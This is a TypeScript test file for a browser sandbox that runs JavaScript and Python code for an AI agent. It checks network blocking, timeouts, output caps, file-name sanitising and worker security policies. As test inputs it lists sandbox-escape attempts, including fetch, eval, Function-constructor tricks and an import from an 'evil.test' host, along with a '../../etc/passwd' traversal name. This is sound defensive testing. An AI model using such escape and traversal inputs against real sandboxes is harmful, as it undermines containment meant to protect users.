import { readFileSync } from "node:fs";
import { resolve } from "node:path";
import vm from "node:vm";
import { afterEach, describe, expect, it, vi } from "vitest";
import { OFFLINE_PYTHON_MESSAGE, createCodeRunner, getCodeTools, toCsv, type WorkerLike } from "../services/CodeRunner";
import { CODE_WORKER_CSP, LIMITS, OutputBuffer, describeRun, findForbiddenJs, lockDownScope, normalizeLanguage, prepareFiles, runJavaScript, safeFileName, toTable, withTrailingReturn, type JsWorkerMessage, type RunResult } from "../services/codeSandbox";
import { workerPolicyFor } from "../../scripts/codeRunnerHeaders";

/** A stand-in Worker: the test decides what it answers, and sees whether it was terminated. */
class FakeWorker implements WorkerLike {
  onmessage: ((event: MessageEvent) => void) | null = null;
  onerror: ((event: ErrorEvent) => void) | null = null;
  terminated = false;
  posted: unknown[] = [];
  constructor(private readonly respond: (message: any, worker: FakeWorker) => void = () => {}) {}
  postMessage(message: unknown) { this.posted.push(message); queueMicrotask(() => this.respond(message, this)); }
  terminate() { this.terminated = true; }
  emit(data: unknown) { this.onmessage?.({ data } as MessageEvent); }
}

/** Runs runJavaScript inside a fresh V8 context, as the JS worker does in its own global scope. */
async function runInContext(code: string, globals: Record<string, unknown> = {}, files: Array<{ name: string; text: string }> = []) {
  const context = vm.createContext({ ...globals });
  const AsyncFunction = vm.runInContext("(async function () {}).constructor", context);
  const scope = vm.runInContext("globalThis", context);
  const messages: JsWorkerMessage[] = [];
  await runJavaScript(code, files, { scope, AsyncFunction, post: (message) => messages.push(message) });
  const output = messages.filter((message): message is Extract<JsWorkerMessage, { type: "out" }> => message.type === "out").map((message) => message.text).join("");
  const done = messages.find((message): message is Extract<JsWorkerMessage, { type: "done" }> => message.type === "done");
  return { output, done, messages, scope };
}

afterEach(() => { vi.useRealTimers(); });

describe("the JavaScript sandbox", () => {
  it("runs code, prints, and shows the trailing expression's value", async () => {
    const { output, done } = await runInContext("const xs = [1, 2, 3];\nconsole.log('sum', xs.reduce((a, b) => a + b, 0));\nxs.map((x) => x * 2)");
    expect(output).toBe("sum 6\n");
    expect(done).toEqual({ type: "done", result: "[2, 4, 6]" });
  });

  it("supports await and an explicit return", async () => {
    const { done } = await runInContext("const value = await Promise.resolve(21);\nreturn value * 2;");
    expect(done?.result).toBe("42");
  });

  it("blocks fetch, XMLHttpRequest, WebSocket, importScripts, eval and new Function", async () => {
    const fakeNetwork = vi.fn(async () => "leaked");
    const globals = { fetch: fakeNetwork, XMLHttpRequest: class {}, WebSocket: class {}, EventSource: class {}, importScripts: vi.fn(), Worker: class {}, setTimeout };
    for (const attempt of [
      "await fetch('https://example.com')",
      "new XMLHttpRequest()",
      "new WebSocket('wss://example.com')",
      "new EventSource('https://example.com')",
      "importScripts('https://example.com/x.js')",
      "new Worker('x.js')",
      "eval('1 + 1')",
      "Function('return 1')()",
      "(function () {}).constructor('return fetch')()",
      "(async function () {}).constructor('return 1')()",
      "globalThis.fetch('https://example.com')",
      "Object.getPrototypeOf(globalThis).fetch('https://example.com')",
      "setTimeout('fetch(1)', 0)",
    ]) {
      const { done } = await runInContext(attempt, globals);
      expect({ attempt, error: done?.error }).toEqual({ attempt, error: expect.stringMatching(/blocked|needs a function|not a function|is not a constructor/) });
    }
    expect(fakeNetwork).not.toHaveBeenCalled();
  });

  it("refuses import and require before running anything", async () => {
    expect(findForbiddenJs("const m = await import('https://evil.test/x.js')")).toMatch(/import isn't available/);
    expect(findForbiddenJs("require('fs')")).toMatch(/require\(\) isn't available/);
    expect(findForbiddenJs("console.log('important')")).toBeNull();
    const { done } = await runInContext("await import('data:text/javascript,1')");
    expect(done?.error).toMatch(/import isn't available/);
  });

  it("reports syntax and runtime errors", async () => {
    expect((await runInContext("const = 1")).done?.error).toMatch(/SyntaxError/);
    expect((await runInContext("null.x")).done?.error).toMatch(/TypeError/);
    expect((await runInContext("throw 'plain'")).done?.error).toBe("Uncaught plain");
  });

  it("gives the code its files and turns console.table into a table", async () => {
    const { done, messages } = await runInContext("console.table(files['data.csv'].split('\\n').slice(1).map((line) => ({ month: line.split(',')[0], value: Number(line.split(',')[1]) })))", {}, [{ name: "data.csv", text: "month,value\nJan,3\nFeb,5" }]);
    expect(done?.error).toBeUndefined();
    expect(messages.find((message) => message.type === "table")).toEqual({ type: "table", table: { columns: ["(index)", "month", "value"], rows: [["0", "\"Jan\"", "3"], ["1", "\"Feb\"", "5"]], truncated: false } });
  });

  it("stops sending output past the cap", async () => {
    const { output } = await runInContext("for (let i = 0; i < 100000; i++) console.log('x'.repeat(50));");
    expect(output.length).toBeLessThan(LIMITS.maxOutputChars + 100);
  });
});

describe("locking down a scope", () => {
  it("removes network entry points along the prototype chain and narrows fetch to a prefix", async () => {
    const realFetch = vi.fn(async (input: unknown) => `fetched ${String(input)}`);
    const proto = { fetch: realFetch, WebSocket: class {} };
    const scope = Object.create(proto) as Record<string, any>;
    scope.XMLHttpRequest = class {};
    lockDownScope(scope, { allowFetch: { prefix: "https://cdn.test/pyodide/", fetch: realFetch } });
    await expect(scope.fetch("https://cdn.test/pyodide/numpy.whl")).resolves.toBe("fetched https://cdn.test/pyodide/numpy.whl");
    await expect(scope.fetch("https://evil.test/")).rejects.toThrow(/blocked/);
    await expect(scope.fetch({ url: "https://evil.test/" })).rejects.toThrow(/blocked/);
    expect(() => new scope.XMLHttpRequest()).toThrow(/blocked/);
    expect(() => new scope.WebSocket()).toThrow(/blocked/);
    expect("fetch" in proto).toBe(false);
    // The replacements can't be swapped back.
    expect(() => { "use strict"; scope.fetch = realFetch; }).toThrow();
  });
});

describe("helpers", () => {
  it("maps code fence tags to languages", () => {
    expect(normalizeLanguage("py")).toBe("python");
    expect(normalizeLanguage("Python3")).toBe("python");
    expect(normalizeLanguage("js")).toBe("javascript");
    expect(normalizeLanguage("ts")).toBeNull();
    expect(normalizeLanguage("")).toBeNull();
  });

  it("returns a trailing expression only when the last line is one", () => {
    expect(withTrailingReturn("const a = 1;\na + 1;")).toBe("const a = 1;\nreturn (a + 1);");
    expect(withTrailingReturn("if (x) {\n  y();\n}")).toBeNull();
    expect(withTrailingReturn("const a = 1")).toBeNull();
    expect(withTrailingReturn("return 5")).toBeNull();
  });

  it("caps combined output and marks it truncated", () => {
    const buffer = new OutputBuffer(10);
    expect(buffer.append("stdout", "12345")).toBe(true);
    expect(buffer.append("stderr", "6789012")).toBe(false);
    expect(buffer).toMatchObject({ stdout: "12345", stderr: "67890", truncated: true });
    expect(buffer.append("stdout", "more")).toBe(false);
  });

  it("keeps file names safe and files within limits", () => {
    expect(safeFileName("../../etc/passwd")).toBe("passwd");
    expect(safeFileName("..hidden")).toBe("hidden");
    expect(safeFileName("my data (1).csv")).toBe("my data _1_.csv");
    const files = prepareFiles([{ name: "a.csv", text: "1" }, { name: "a.csv", text: "2" }, { name: "big.txt", text: "x".repeat(LIMITS.maxFileChars + 1) }, ...Array.from({ length: 6 }, (_, index) => ({ name: `f${index}.txt`, text: "" }))]);
    expect(files.map((file) => file.name)).toEqual(["a.csv", "f0.txt", "f1.txt", "f2.txt"]);
  });

  it("turns rows into a table", () => {
    expect(toTable([[1, 2], [3]])).toEqual({ columns: ["(index)", "0", "1"], rows: [["0", "1", "2"], ["1", "3", ""]], truncated: false });
    expect(toTable(null)).toBeNull();
  });

  it("writes CSV for attached tables", () => {
    expect(toCsv(["Name", "Note"], [["Ann", "says \"hi\""], ["Bo", "a,b"]])).toBe("Name,Note\nAnn,\"says \"\"hi\"\"\"\nBo,\"a,b\"");
  });

  it("summarises a run for the model without the image data", () => {
    const run: RunResult = { language: "python", status: "ok", stdout: "hi\n", stderr: "", images: ["iVBORw0KGgo="], truncated: false, durationMs: 12.4, files: [] };
    expect(describeRun(run)).toEqual({ status: "ok", language: "python", stdout: "hi\n", images: "1 image shown to the user under the code", durationMs: 12 });
  });
});

describe("the runner", () => {
  it("runs JavaScript in a fresh worker and terminates it afterwards", async () => {
    const workers: FakeWorker[] = [];
    const runner = createCodeRunner({ workersSupported: () => true, createWorker: () => {
      const worker = new FakeWorker((_message, self) => { self.emit({ type: "out", stream: "stdout", text: "hello\n" }); self.emit({ type: "done", result: "3" }); });
      workers.push(worker);
      return worker;
    } });
    const first = await runner.run({ language: "javascript", code: "console.log('hello'); 1 + 2" });
    expect(first).toMatchObject({ status: "ok", stdout: "hello\n", result: "3", truncated: false });
    await runner.run({ language: "javascript", code: "1" });
    expect(workers).toHaveLength(2);
    expect(workers.every((worker) => worker.terminated)).toBe(true);
  });

  it("kills a worker that runs past the time limit", async () => {
    vi.useFakeTimers();
    const worker = new FakeWorker((_message, self) => self.emit({ type: "out", stream: "stdout", text: "started\n" }));
    const runner = createCodeRunner({ workersSupported: () => true, createWorker: () => worker });
    const pending = runner.run({ language: "javascript", code: "while (true) {}", timeoutMs: 2_000 });
    await vi.advanceTimersByTimeAsync(2_001);
    const result = await pending;
    expect(result).toMatchObject({ status: "timeout", stdout: "started\n" });
    expect(result.error).toMatch(/Stopped after 2 s/);
    expect(worker.terminated).toBe(true);
  });

  it("caps output, images and tables from a worker", async () => {
    const runner = createCodeRunner({ workersSupported: () => true, createWorker: () => new FakeWorker((_message, self) => {
      for (let index = 0; index < 50; index += 1) self.emit({ type: "out", stream: "stdout", text: "y".repeat(1_000) });
      self.emit({ type: "table", table: { columns: ["a"], rows: Array.from({ length: 80 }, (_, index) => [String(index)]), truncated: false } });
      self.emit({ type: "done", result: "r".repeat(LIMITS.maxResultChars + 10) });
    }) });
    const result = await runner.run({ language: "javascript", code: "noisy()" });
    expect(result.stdout.length).toBe(LIMITS.maxOutputChars);
    expect(result.table?.rows).toHaveLength(LIMITS.maxTableRows);
    expect(result.result?.startsWith("r".repeat(LIMITS.maxResultChars))).toBe(true);
    expect(result.truncated).toBe(true);
  });

  it("keeps the Python worker between runs, gives it a longer limit while it downloads, and restarts it after a timeout", async () => {
    vi.useFakeTimers();
    const created: FakeWorker[] = [];
    let mode: "load-slowly" | "ok" | "hang" = "load-slowly";
    const runner = createCodeRunner({ workersSupported: () => true, isOnline: () => true, createWorker: () => {
      const worker = new FakeWorker((message, self) => {
        if (mode === "load-slowly") {
          self.emit({ type: "status", id: message.id, text: "Downloading Python (first time only)…" });
          setTimeout(() => { self.emit({ type: "loaded", id: message.id }); self.emit({ type: "out", id: message.id, stream: "stdout", text: "4\n" }); self.emit({ type: "done", id: message.id, images: ["iVBORw0KGgo=", "not base64!"] }); }, 30_000);
        } else if (mode === "ok") {
          self.emit({ type: "loaded", id: message.id });
          self.emit({ type: "done", id: message.id, result: "'again'" });
        } else {
          self.emit({ type: "loaded", id: message.id });
        }
      });
      created.push(worker);
      return worker;
    } });
    const statuses: string[] = [];
    const first = runner.run({ language: "python", code: "print(2 + 2)", onStatus: (text) => statuses.push(text) });
    await vi.advanceTimersByTimeAsync(30_000);
    expect(await first).toMatchObject({ status: "ok", stdout: "4\n", images: ["iVBORw0KGgo="] });
    expect(statuses).toEqual(["Downloading Python (first time only)…"]);

    mode = "ok";
    expect(await runner.run({ language: "python", code: "'again'" })).toMatchObject({ status: "ok", result: "'again'" });
    expect(created).toHaveLength(1);

    mode = "hang";
    const hung = runner.run({ language: "python", code: "while True: pass", timeoutMs: 3_000 });
    await vi.advanceTimersByTimeAsync(3_001);
    expect(await hung).toMatchObject({ status: "timeout" });
    expect((await hung).error).toMatch(/Python was restarted/);
    expect(created[0].terminated).toBe(true);

    mode = "ok";
    await runner.run({ language: "python", code: "1" });
    expect(created).toHaveLength(2);
  });

  it("says Python needs a connection the first time when offline", async () => {
    const createWorker = vi.fn();
    const runner = createCodeRunner({ workersSupported: () => true, isOnline: () => false, createWorker });
    const result = await runner.run({ language: "python", code: "1 + 1" });
    expect(result).toMatchObject({ status: "unavailable", error: OFFLINE_PYTHON_MESSAGE });
    expect(createWorker).not.toHaveBeenCalled();
  });

  it("refuses empty, oversized or unsupported code and browsers without workers", async () => {
    const runner = createCodeRunner({ workersSupported: () => true, createWorker: () => new FakeWorker() });
    expect((await runner.run({ language: "javascript", code: "  " })).error).toMatch(/no code/);
    expect((await runner.run({ language: "javascript", code: "x".repeat(LIMITS.maxCodeChars + 1) })).error).toMatch(/longer than/);
    expect((await runner.run({ language: "ruby" as never, code: "puts 1" })).error).toMatch(/Only Python and JavaScript/);
    const noWorkers = createCodeRunner({ workersSupported: () => false });
    expect(await noWorkers.run({ language: "javascript", code: "1" })).toMatchObject({ status: "unavailable" });
  });

  it("offers run_code to the agent and returns a compact result", async () => {
    const run = vi.fn(async () => ({ language: "javascript", status: "ok", stdout: "55\n", stderr: "", images: [], truncated: false, durationMs: 3, files: [] }) as RunResult);
    const [tool] = getCodeTools({ run } as never);
    expect(tool.name).toBe("run_code");
    expect(tool.requiresApproval).toBeFalsy();
    await expect(tool.execute({ language: "javascript", code: "console.log(55)" })).resolves.toMatchObject({ status: "ok", stdout: "55\n" });
    expect(run).toHaveBeenCalledWith({ language: "javascript", code: "console.log(55)", files: [] });
  });
});

describe("worker Content-Security-Policy", () => {
  it("matches the worker files in dev and in the build", () => {
    expect(workerPolicyFor("/assets/jsRunner.worker-GpWsAnjN.js")).toBe(CODE_WORKER_CSP.javascript);
    expect(workerPolicyFor("/src/workers/pyRunner.worker.ts?worker_file&type=module")).toBe(CODE_WORKER_CSP.python);
    expect(workerPolicyFor("/assets/main-abc.js")).toBeNull();
  });

  it("vercel.json sends the same policies on the website", () => {
    const vercel = JSON.parse(readFileSync(resolve(__dirname, "../../../vercel.json"), "utf8")) as { headers: Array<{ source: string; headers: Array<{ key: string; value: string }> }> };
    const policy = (source: string) => vercel.headers.find((entry) => entry.source === source)?.headers.find((header) => header.key === "Content-Security-Policy")?.value;
    expect(policy("/assets/jsRunner.worker-(.*)")).toBe(CODE_WORKER_CSP.javascript);
    expect(policy("/assets/pyRunner.worker-(.*)")).toBe(CODE_WORKER_CSP.python);
    expect(CODE_WORKER_CSP.javascript).toContain("connect-src 'none'");
  });
});
